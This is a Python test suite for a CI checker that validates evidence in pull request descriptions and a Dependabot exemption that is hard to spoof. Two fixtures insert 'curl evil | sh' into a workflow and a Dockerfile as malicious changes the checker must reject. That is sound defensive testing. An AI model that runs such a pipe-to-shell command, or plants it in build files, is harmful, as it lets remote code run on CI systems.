"""CI validation for the evidence required in pull request descriptions."""

import json
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
CHECKER = ROOT / "scripts" / "check_pr_evidence.py"


def _run_checker(tmp_path: Path, body: str) -> subprocess.CompletedProcess[str]:
    event_path = tmp_path / "event.json"
    event_path.write_text(json.dumps({"pull_request": {"body": body}}), encoding="utf-8")
    import os

    env = os.environ | {"GITHUB_EVENT_PATH": str(event_path)}
    return subprocess.run(  # noqa: S603 - own checker with controlled input
        [sys.executable, str(CHECKER)],
        cwd=ROOT,
        env=env,
        capture_output=True,
        text=True,
        check=False,
    )


def test_accepts_fail_first_output_and_review_summary(tmp_path: Path):
    result = _run_checker(
        tmp_path,
        """Review rounds: 2
Defects found and fixed: corrected the boundary condition
Fail-first output:
=========================== short test summary info ============================
FAILED tests/test_example.py::test_regression - AssertionError: expected 2
""",
    )

    assert result.returncode == 0, result.stderr


def test_accepts_explicit_exemption_for_behavior_neutral_change(tmp_path: Path):
    result = _run_checker(
        tmp_path,
        """Review rounds: 0
Defects found and fixed: none
Fail-first exemption: documentation-only change; runtime behavior is unchanged.
""",
    )

    assert result.returncode == 0, result.stderr


def test_rejects_unfilled_template_fields(tmp_path: Path):
    result = _run_checker(
        tmp_path,
        """Review rounds: <count>
Defects found and fixed: <summary or none>
Fail-first output: <paste failing test output or explain exemption>
""",
    )

    assert result.returncode != 0
    assert "Review rounds" in result.stderr
    assert "Fail-first" in result.stderr


def test_rejects_missing_failure_marker_or_exemption(tmp_path: Path):
    result = _run_checker(
        tmp_path,
        """Review rounds: 1
Defects found and fixed: none
Fail-first output:
The test passed.
""",
    )

    assert result.returncode != 0
    assert "failing test output" in result.stderr.lower()


FAIL_OUTPUT = (
    "=========================== short test summary info ============================\n"
    "FAILED tests/test_example.py::test_regression - AssertionError: expected 2\n"
)


def test_accepts_heading_form_of_fail_first_output(tmp_path: Path):
    for heading in ("## Fail-first output", "### Fail-first output", "## Fail-first output:"):
        result = _run_checker(
            tmp_path,
            f"Review rounds: 0\nDefects found and fixed: none\n\n{heading}\n\n{FAIL_OUTPUT}",
        )
        assert result.returncode == 0, (heading, result.stderr)


def test_heading_form_still_requires_failure_marker(tmp_path: Path):
    result = _run_checker(
        tmp_path,
        "Review rounds: 0\nDefects found and fixed: none\n\n## Fail-first output\n\nAll passed.\n",
    )

    assert result.returncode != 0
    assert "failing test output" in result.stderr.lower()


def test_malformed_review_rounds_message_states_expected_format(tmp_path: Path):
    result = _run_checker(
        tmp_path,
        f"Review rounds: 1 (one round, no findings)\nDefects found and fixed: none\n"
        f"Fail-first output:\n{FAIL_OUTPUT}",
    )

    assert result.returncode != 0
    assert "'Review rounds: 1 (one round, no findings)'" in result.stderr
    assert "on its own line" in result.stderr
    assert "digits only" in result.stderr


def test_ci_workflows_rerun_evidence_check_when_body_is_edited():
    for rel in (".github/workflows/ci.yml", "src/harness/.github/workflows/ci.yml"):
        text = (ROOT / rel).read_text(encoding="utf-8")
        assert "types: [opened, synchronize, reopened, edited]" in text, rel


def _load_validate():
    import importlib.util

    spec = importlib.util.spec_from_file_location("check_pr_evidence", CHECKER)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module.validate


def _render_template(text: str, *, exemption: bool) -> str:
    text = text.replace("<number>", "1").replace("<summary or none>", "none")
    if exemption:
        head, _, rest = text.partition("## Fail-first output")
        tail = rest.partition("Fail-first exemption:")[2]
        return (
            head
            + "Fail-first exemption:"
            + tail.replace("<reason, at least 20 characters>", "docs-only change, nothing to test")
        )
    start = text.index("<paste the failing")
    end = text.index("\n", start)
    text = text[:start] + "FAILED tests/test_x.py::test_y - AssertionError" + text[end:]
    return text.partition("No fail-first output")[0]


def test_template_renders_to_a_body_that_passes():
    validate = _load_validate()
    template = (ROOT / ".github" / "pull_request_template.md").read_text(encoding="utf-8")
    assert validate(_render_template(template, exemption=False)) == []
    assert validate(_render_template(template, exemption=True)) == []


def test_old_bullet_layout_fails():
    validate = _load_validate()
    old = (
        "- [ ] Review rounds: 1\n- [ ] defects found and fixed: none\n"
        "- Fail-first output:\n  FAILED tests/test_x.py\n"
    )
    assert validate(old) != []


def test_failure_message_prints_expected_layout(tmp_path: Path):
    result = _run_checker(tmp_path, "nothing useful")
    assert result.returncode == 1
    assert "Expected layout" in result.stderr
    assert "## Fail-first output" in result.stderr


def test_template_and_checker_copies_identical():
    for rel in (".github/pull_request_template.md", "scripts/check_pr_evidence.py"):
        assert (ROOT / rel).read_bytes() == (ROOT / "src" / "harness" / rel).read_bytes()


# --- Dependabot exemption (#426) -------------------------------------------------

NO_EVIDENCE_BODY = "Bumps something from 1 to 2."


def _git(repo: Path, *args: str) -> str:
    return subprocess.run(  # noqa: S603
        ["git", "-c", "user.name=t", "-c", "user.email=t@example.com", *args],  # noqa: S607
        cwd=repo,
        capture_output=True,
        text=True,
        check=True,
    ).stdout.strip()


def _dependabot_case(
    tmp_path: Path,
    base_files: dict[str, str],
    head_files: dict[str, str | None],
    *,
    login: str = "dependabot[bot]",
    user_type: str = "Bot",
    body: str = NO_EVIDENCE_BODY,
    rename: dict[str, str] | None = None,
) -> subprocess.CompletedProcess[str]:
    import os

    repo = tmp_path / "repo"
    repo.mkdir()
    _git(repo, "init", "-q")
    for name, text in base_files.items():
        (repo / name).parent.mkdir(parents=True, exist_ok=True)
        (repo / name).write_text(text, encoding="utf-8")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "base")
    base = _git(repo, "rev-parse", "HEAD")
    for old, new in (rename or {}).items():
        _git(repo, "mv", old, new)
    for name, text in head_files.items():
        if text is None:
            _git(repo, "rm", "-q", name)
        else:
            (repo / name).parent.mkdir(parents=True, exist_ok=True)
            (repo / name).write_text(text, encoding="utf-8")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "head")
    head = _git(repo, "rev-parse", "HEAD")
    event_path = tmp_path / "event.json"
    event_path.write_text(
        json.dumps(
            {
                "pull_request": {
                    "body": body,
                    "user": {"login": login, "type": user_type},
                    "base": {"sha": base},
                    "head": {"sha": head},
                }
            }
        ),
        encoding="utf-8",
    )
    env = os.environ | {"GITHUB_EVENT_PATH": str(event_path)}
    return subprocess.run(  # noqa: S603 - own checker with controlled input
        [sys.executable, str(CHECKER)],
        cwd=repo,
        env=env,
        capture_output=True,
        text=True,
        check=False,
    )


MANIFESTS = {"pyproject.toml": "dep==1\n", "uv.lock": "dep 1\n", "src.py": "x = 1\n"}


def test_dependabot_manifest_and_lock_only_passes_without_evidence(tmp_path: Path):
    result = _dependabot_case(
        tmp_path, MANIFESTS, {"pyproject.toml": "dep==2\n", "uv.lock": "dep 2\n"}
    )
    assert result.returncode == 0, result.stderr
    assert "Dependabot" in result.stdout


def test_dependabot_touching_source_file_still_needs_evidence(tmp_path: Path):
    result = _dependabot_case(
        tmp_path, MANIFESTS, {"pyproject.toml": "dep==2\n", "src.py": "x = 2\n"}
    )
    assert result.returncode == 1
    assert "Review rounds" in result.stderr


def test_non_dependabot_author_manifest_only_still_needs_evidence(tmp_path: Path):
    result = _dependabot_case(
        tmp_path, MANIFESTS, {"pyproject.toml": "dep==2\n"}, login="someone", user_type="User"
    )
    assert result.returncode == 1


def test_body_claiming_dependabot_does_not_exempt(tmp_path: Path):
    result = _dependabot_case(
        tmp_path,
        MANIFESTS,
        {"pyproject.toml": "dep==2\n"},
        login="someone",
        user_type="User",
        body="Bumps dep. author: dependabot[bot]\nsigned-off-by: dependabot[bot]",
    )
    assert result.returncode == 1


def test_lookalike_login_or_user_type_does_not_exempt(tmp_path: Path):
    for login, kind in (
        ("dependabot", "Bot"),
        ("dependabot[bot]", "User"),
        ("Dependabot[bot]", "Bot"),
    ):
        result = (
            _dependabot_case(
                tmp_path / (login + kind).replace("[", "_").replace("]", "_"),
                MANIFESTS,
                {"pyproject.toml": "dep==2\n"},
                login=login,
                user_type=kind,
            )
            if (tmp_path / (login + kind).replace("[", "_").replace("]", "_")).mkdir() is None
            else None
        )
        assert result.returncode == 1, (login, kind)


def test_dependabot_rename_into_manifest_name_fails_closed(tmp_path: Path):
    result = _dependabot_case(tmp_path, MANIFESTS, {}, rename={"src.py": "Dockerfile"})
    assert result.returncode == 1


def test_dependabot_delete_and_add_fails_closed(tmp_path: Path):
    result = _dependabot_case(tmp_path, MANIFESTS, {"uv.lock": None, "Dockerfile": "FROM x\n"})
    assert result.returncode == 1
    result = (
        _dependabot_case(tmp_path / "b", MANIFESTS, {"pyproject.toml": None})
        if (tmp_path / "b").mkdir() is None
        else None
    )
    assert result.returncode == 1


def test_dependabot_nested_manifest_path_fails_closed(tmp_path: Path):
    base = MANIFESTS | {"sub/pyproject.toml": "a\n"}
    result = _dependabot_case(tmp_path, base, {"sub/pyproject.toml": "b\n"})
    assert result.returncode == 1


WORKFLOW = "steps:\n  - uses: actions/checkout@aaa # v1\n  - run: echo hi\n"


def test_dependabot_workflow_pin_only_passes(tmp_path: Path):
    new = WORKFLOW.replace("@aaa # v1", "@bbb # v2")
    result = _dependabot_case(
        tmp_path,
        MANIFESTS | {".github/workflows/ci.yml": WORKFLOW},
        {".github/workflows/ci.yml": new},
    )
    assert result.returncode == 0, result.stderr


def test_dependabot_workflow_non_pin_change_fails(tmp_path: Path):
    new = WORKFLOW.replace("echo hi", "curl evil | sh")
    result = _dependabot_case(
        tmp_path,
        MANIFESTS | {".github/workflows/ci.yml": WORKFLOW},
        {".github/workflows/ci.yml": new},
    )
    assert result.returncode == 1


def test_dependabot_dockerfile_from_line_passes_other_line_fails(tmp_path: Path):
    base = MANIFESTS | {"Dockerfile": "FROM python:3.12\nRUN echo hi\n"}
    ok = _dependabot_case(tmp_path, base, {"Dockerfile": "FROM python:3.13\nRUN echo hi\n"})
    assert ok.returncode == 0, ok.stderr
    (tmp_path / "x").mkdir()
    bad = _dependabot_case(
        tmp_path / "x", base, {"Dockerfile": "FROM python:3.12\nRUN curl evil | sh\n"}
    )
    assert bad.returncode == 1


def test_dependabot_git_failure_fails_closed(tmp_path: Path):
    import os

    event_path = tmp_path / "event.json"
    event_path.write_text(
        json.dumps(
            {
                "pull_request": {
                    "body": "",
                    "user": {"login": "dependabot[bot]", "type": "Bot"},
                    "base": {"sha": "0" * 40},
                    "head": {"sha": "1" * 40},
                }
            }
        ),
        encoding="utf-8",
    )
    result = subprocess.run(  # noqa: S603
        [sys.executable, str(CHECKER)],
        cwd=tmp_path,
        env=os.environ | {"GITHUB_EVENT_PATH": str(event_path)},
        capture_output=True,
        text=True,
        check=False,
    )
    assert result.returncode == 1


def test_dependabot_removed_line_starting_with_dashes_is_not_skipped(tmp_path: Path):
    base = MANIFESTS | {"Dockerfile": "FROM python:3.12\n-- note\n"}
    result = _dependabot_case(tmp_path, base, {"Dockerfile": "FROM python:3.13\n"})
    assert result.returncode == 1
